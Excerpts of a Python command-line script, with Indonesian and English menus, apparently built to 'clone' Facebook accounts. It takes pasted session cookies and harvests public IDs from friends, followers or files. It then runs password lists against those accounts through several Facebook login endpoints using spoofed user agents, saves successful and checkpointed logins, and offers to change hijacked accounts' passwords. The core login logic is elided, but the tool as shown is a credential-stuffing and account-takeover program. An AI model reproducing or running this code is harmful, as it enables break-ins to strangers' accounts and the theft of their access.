...
# VALODATE
ua = 'Opera/9.80 (Linux; U; Android 12; ko-kr; SM-S906N Build/QP1A.190711.020; wv) Presto/2.12.388 Version/12.16.2 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 Edge/18.19582 Gecko/20100101 Firefox/101.0 Mozilla/5.0 Netscape/9.1.0285 Safari/7046A194A Thunderbird/38.2.0 Lightning/4.0.2'
ua = 'Mozilla/5.0 (Linux; U; Android 12; ko-kr; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 Edge/18.19582 Gecko/20100101 Firefox/101.0 Mozilla/5.0 Netscape/9.1.0285 Safari/7046A194A Thunderbird/38.2.0 Lightning/4.0.2'
...
def ConvertCookie(cookies):
    with requests.Session() as x:
         x.headers.update({
            "user-agent":"Mozilla/5.0 (Linux; U; Android 12; ko-kr; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 Edge/18.19582 Gecko/20100101 Firefox/101.0Mozilla/5.0 Netscape/9.1.0285 Safari/7046A194A Thunderbird/38.2.0 Lightning/4.0.2","referer": "https://www.facebook.com/","host": "business.facebook.com",
         ...
         except AttributeError:return 'login failed!'

def CheckingResults():
    exei,exex = 0, []
    exec = ('[green][[white]1[green]]. [bold white]Cek hasil akun OK\n[green][[white]2[green]]. [bold white]Cek hasil akun CP\n[green][[white]0[green]]. [bold white]Kembali') ; Console(width=60).print(Panel(exec,style='bold green'))
    zprint('• [bold white]CHOOSE salah satu')
...
def ChekOption():
    exec = '[bold green][[bold white]1[bold green]]. [bold white]CHECK SINGLE ID\n[bold green][[bold white]2[bold green]]. [bold white]CHECK IDS IN FILE\n[bold green][[bold red]0[bold green]]. [bold white]Kembali'
    Console(width=60).print(Panel(exec,style='bold green'))
    zprint('• [bold white]SELECT ONE OPTION FROM MENU ')
    ask = console.input('• CHOOSEan : ')
    if ask in ['1','01']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]FOR EXAMPLE : ID:PASSWORD' ; Console(width=60).print(Panel(asik,style='bold green'))
         user = console.input('• ID|PASSWORD : ')
         try:uid,nama = user.split('|')
         except:exit('\n [×] There is error. Please enter the details again. Thank You.')
         CekOptionAcount(uid,nama)
    elif ask in ['2','02']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]Masukan nama file berisi akun chekpoint' ; Console(width=60).print(Panel(asik,style='bold green'))
...
def Banner():
 ...
 #     # #     # #     # #       #       #     # 
  #####  #     # #     # ####### ####### #     # 
                            '''
    Console(width=60).print(Panel(KAGLK,style='bold green'),justify='center')

def Masuk():
    Clear_Terminal(platform) ; Banner()
    ask = '[bold white]                PASTE FRESH COOKIES BELOW !' ; Console(width=60).print(Panel(ask,style='bold green'))
    coki = file = console.input('[bold green]• [yellow]Masukan cookies : ')
    if coki in ['',' ']:Masuk()
    else:
...
def menu():
    ...
    Banner() ; time.sleep(2.0) ; exec = (f'[bold white]                    ENJOY CLONING : )') ; Console(width=60).print(Panel(exec,style='bold green'))
    list = ('''[bold green][[bold white]1[bold green]]. [bold white]PUBLIC ID CLONING
[bold green][[bold white]2[bold green]]. [bold white]FILE CLONING
[bold green][[bold white]3[bold green]]. [bold white]FOLLOWERS CLONING
[bold green][[bold white]4[bold green]]. [bold white]RANDOM EMIAL CLONING
[bold green][[bold white]5[bold green]]. [bold white]CHECK RESULTS
[bold green][[bold white]6[bold green]]. [bold white]CP ID OPTIONS
[bold green][[bold white]0[bold green]]. [bold white]EXIT''') ; Console(width=60).print(Panel(list,style='bold green'))
    zprint('[bold green]• [bold white]SELECT ONE OPTION FROM MENU')
    assk = console.input('[bold green]• [bold green]SELECT : ')
    if assk in ['1','01']:
          zprint('• [bold green]ENTER PUBLIC ID.')
          id = console.input('• [bold green]ENTER ID : ')
          try:
                ...
                Console(width=60).print(Panel(f'[bold white]THE ID YOU ENTERED IS NOT A PUBLIC ID',style='bold green')) ; time.sleep(2) ; menu()
          AturUser()

    elif assk in ['2','02']:
         
         zprint('• [bold white]ENTER PUBLIC ID')
         id = console.input('• [bold white]ENTER ID: ')
         ...
         Console(width=60).print(Panel('[bold white]Masukan nama target gunakan tanda koma untuk pemisahan contoh pemisahan nama : andi,andika',style='bold green'))
    ...
    elif assk in ['5','05']:CheckingResults()
    elif assk in ['6','06']:ChekOption()
    elif assk in ['0','00']:os.system('rm -rf data/token.txt && rm -rf data/cokie.txt') ; exit(0)
    else:menu()

def AturUser():
    Console(width=60).print(Panel(f'[bold green][[bold white]*[bold green]] [bold white]TOTAL IDS : {len(ID)}',style='bold green'))
    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]OLD ID CLONING
[bold green][[bold white]2[bold green]]. [bold white]NEW ID CLONING
[bold green][[bold white]3[bold green]]. [bold white]RANDOM ID CLONING''') ; Console(width=60).print(Panel(exec ,style='bold green'))
    zprint('• [bold green]Di sarankan from ID new')
    idndi = console.input('• [bold green]Atur id : ')
    if idndi in ['1','01']:
         for i in ID:
               ID2.append(i)
    elif idndi in ['2','02']:
...
def AturLogin():
    metod = ('''[bold green][[bold white]1[bold green]]. [bold white]REGULAR CLONING METHOD
[bold green][[bold white]2[bold green]]. [bold white]REGULAR CLONING WEB METHOD
[bold green][[bold white]3[bold green]]. [bold white]CLONING WITH PASSWORD ''') ; Console(width=60).print(Panel(metod,style='bold green'))
    z = console.input('• [bold green]CHOOSE : ')
    ...
    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]START CLONING USING free.facebook.com
[bold green][[bold white]2[bold green]]. [bold white]START CLONING USING mbasic.facebook.com
[bold green][[bold white]3[bold green]]. [bold white]START CLONING USING mobile.facebook.com''') ; Console(width=60).print(Panel(exec ,style='bold green'))
    zprint('• [bold white]Silakan CHOOSE [bold green]url login[bold white]')
    ...
    pwh = ('[bold green][[bold white]?[bold green]] [bold white]CHANGE ACCOUNT PASSWORD OK?') ; Console(width=60).print(Panel(pwh,style='bold green'))
    zprint('• [bold white]CHOOSE Y/N ')
    ubah = console.input('• [bold white]ENTER NEW PASSWORD : ')
    if ubah in ['y','Y','iya']:
          UbahPw.append('ya')
          add_Password = console.input('• [bold white]ENTER A NEW PASSWORD : [bold green]')
...
class WordlistLogin:
    ...
    def password(self,link):
        exec = (f'[bold green][[bold white]*[bold green]]. [bold white]OK save in : OK/{indo}.txt\n[bold green][[bold white]*[bold green]]. [bold white]CP save in : CP/{indo}.txt') ; Console(width=60).print(Panel(exec ,style='bold green'))
    ...
    def UserAgent(self):
        ...
        return str(rc([f"Mozilla/5.0 (Linux; U; Android 12; en-us; SM-S906N Build/QP1A.190711.020 AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.79{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/537.36 {str(rc(['S40OviBrowser','HeyTapBrowser']))}/{str(rr(2,40))}.7.36.1",f"Opera/9.80 (Linux; U; Android 12; ko-kr; SM-S906N; wv); en-us; Build/QP1A.190711.020 AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.79 Mobile Safari/537.36"]))
    ...
    def Validate(self, user, pwx, url):
        ...
        for pw in pwx:
             try:
                     with requests.Session() as x:
                          agen = ua #'Mozilla/5.0 (Linux; U; Android 8.0.0; ASUS_X00RD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",'
